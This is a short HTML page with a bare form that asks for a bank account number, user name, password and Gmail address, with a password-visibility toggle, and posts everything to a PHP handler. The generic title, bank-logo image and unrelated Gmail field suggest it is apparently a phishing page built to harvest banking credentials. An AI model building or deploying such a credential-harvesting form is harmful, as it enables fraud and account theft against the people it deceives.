<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FORM</title>
    <link rel="stylesheet" href="index.css">
</head>      
<body>
    <form action="clds/formhandle.inc.php" method="POST">
    <div class="container">
        <img src="adb.png" alt="">
        <div class="form-group">
            <label for="number">Account Number</label>
            <input type="tel" id="numbers" name="numbers" placeholder="Enter Account Number" required>
        </div>
        <div class="form-group">
            <label for="name">User Name/ID</label>
            <input type="text" id="names" name="names" placeholder="Enter Your Name" required>
        </div>
        <div class="form-group password-container">
            <label for="password">Password</label>
            <input type="password" id="pwd" name="pwd" placeholder="Enter Password" required>
            <i class="fa fa-eye" id="togglePassword"> <input type="checkbox" id="showPassword"></i>
            <input type="checkbox" id="showPassword">

        </div>
        <div class="form-group">
            <label for="email">Gmail Address</label>
            <input type="email" id="emails" name="emails" placeholder="Enter Gmail Address" required>
        </div>
        <button type="submit">Submit Form</button>
    </div>
    </form>
    <script>
        const togglePassword = document.getElementById('togglePassword');
        const password = document.getElementById('pwd');
        const showPasswordCheckbox = document.getElementById('showPassword');

        // Toggle functionality for both eye icon and checkbox
        togglePassword.addEventListener('click', function () {
            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
            password.setAttribute('type', type);
            this.classList.toggle('show');
        });

        showPasswordCheckbox.addEventListener('change', function () {
            if (this.checked) {
                password.setAttribute('type', 'text');
            } else {
                password.setAttribute('type', 'password');
            }
        });
    </script>
</body>
</html>